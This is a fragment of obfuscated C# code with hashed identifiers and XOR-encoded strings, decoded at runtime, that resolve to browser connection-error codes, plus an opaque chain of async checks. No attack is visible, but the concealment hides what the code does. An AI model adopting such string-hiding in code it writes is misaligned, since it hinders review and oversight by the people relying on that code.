        return _0xc6a8cd1e.IndexOf(_0x581f7fed._0x77e9fe38(new byte[20] { 56, 47, 47, 34, 62, 50, 51, 51, 56, 62, 41, 52, 50, 51, 34, 47, 56, 46, 56, 41 }, 125), StringComparison.OrdinalIgnoreCase) >= 0 || _0xc6a8cd1e.IndexOf(_0x581f7fed._0x77e9fe38(new byte[22] { 98, 117, 117, 120, 100, 104, 105, 105, 98, 100, 115, 110, 104, 105, 120, 117, 98, 97, 114, 116, 98, 99 }, 39), StringComparison.OrdinalIgnoreCase) >= 0 || _0xc6a8cd1e.IndexOf(_0x581f7fed._0x77e9fe38(new byte[21] { 66, 85, 85, 88, 68, 72, 73, 73, 66, 68, 83, 78, 72, 73, 88, 68, 75, 72, 84, 66, 67 }, 7), StringComparison.OrdinalIgnoreCase) >= 0 || _0xc6a8cd1e.IndexOf(_0x581f7fed._0x77e9fe38(new byte[22] { 110, 121, 121, 116, 126, 101, 96, 101, 100, 124, 101, 116, 126, 121, 103, 116, 120, 104, 99, 110, 102, 110 }, 43), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private bool _0x9a137d73()
    {
        _0x1c5e0b7d.RemoveAll(_0xa6e6b25d => _0xa6e6b25d == null || !_0xa6e6b25d.IsAlive);
        return _0x1c5e0b7d.Count > 0;
    }

    private async Task _0x47d1b51b()
    {
        if (await _0xc1c670cf())
            return;
        if (await _0xb55813d2())
            return;
        if (await _0xf5f0354b())
            return;
        _0x69898553();
        await _0x616872e9(_0x162839ed());
        _0x66ac1bd5 = await _0x9f4dd389();
        await _0xa5b82aee();
    }

    internal bool isApplicationFocus = false;
    private string _0xa36d68f7 = "";
    private string _0xef613450 = "";
}

internal static class _0x581f7fed
{
    internal static string _0x77e9fe38(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}